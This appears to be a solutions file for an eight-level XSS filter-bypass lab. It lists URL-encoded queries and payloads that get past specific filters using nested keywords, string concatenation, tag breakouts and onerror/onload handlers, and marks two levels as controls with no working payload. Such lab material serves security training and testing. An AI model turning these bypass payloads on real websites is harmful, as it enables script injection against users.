# waf-bypass — solutions

Classic WAF bypass filters: keyword strip, event strip, quote escape, single-side angle strip, lowercase, equals strip.

### waf-bypass-level1

`/waf-bypass/level1/?query=%3CscrSCRIPTipt%3Ealert(1)%3C/scrSCRIPTipt%3E`

- payload: `<scrSCRIPTipt>alert(1)</scrSCRIPTipt>`
- context: case-insensitive single-pass `script` strip — nested-keyword rejoin

### waf-bypass-level2

`/waf-bypass/level2/?query=%3Cimg%20src=x%20onerror=top%5B%27al%27%2B%27ert%27%5D(1)%3E`

- payload: `<img src=x onerror=top['al'+'ert'](1)>`
- context: alert/confirm/prompt stripped — string concat bypass

### waf-bypass-level3

`/waf-bypass/level3/?query=%22%20autofocus%20o%26%23110%3Bfocus=alert(1)%20x=%22`

- payload: `no payload — control`
- context: reflected into a double-quoted input `value`; angle brackets are
  entity-encoded (no new tags) and every `on\w+=` handler is stripped. The
  previously documented `" autofocus o&#110;focus=alert(1) x="` does **not**
  work: character references are never expanded in attribute *names*, only in
  attribute values and text. Chrome keeps the attribute literally named
  `o&#110;focus` (verified with `--dump-dom`: `hasAttribute('onfocus')` is false
  and the beacon stayed silent). No JS sink is reached.

### waf-bypass-level4

`/waf-bypass/level4/?query=%3C/script%3E%3Csvg%20onload=alert(1)%3E`

- payload: `</script><svg onload=alert(1)>`
- context: quotes entity-escaped inside JS string; close script tag entirely

### waf-bypass-level5

`/waf-bypass/level5/?query=%3Csvg%20onload=alert(1)%3E`

- payload: `no payload — control`
- context: every `<` is stripped, so no tag can open in the body context —
  served output is the inert text `svg onload=alert(1)>`. A defensive stub with
  no tag-opening bypass.

### waf-bypass-level6

`/waf-bypass/level6/?query=%22%3E%3Csvg%20onload=alert(1)%3E`

- payload: `"><svg onload=alert(1)>`
- context: dual reflection — img src attr breakout fires before body sink

### waf-bypass-level7

`/waf-bypass/level7/?query=%3Cimg%20src=x%20onerror=alert(1)%3E`

- payload: `<img src=x onerror=alert(1)>`
- context: lowercased then `script` stripped — img bypasses script filter

### waf-bypass-level8

`/waf-bypass/level8/?query=%3Cscript%3Ealert(1)%3C/script%3E`

- payload: `<script>alert(1)</script>`
- context: `=` stripped — script tag needs none
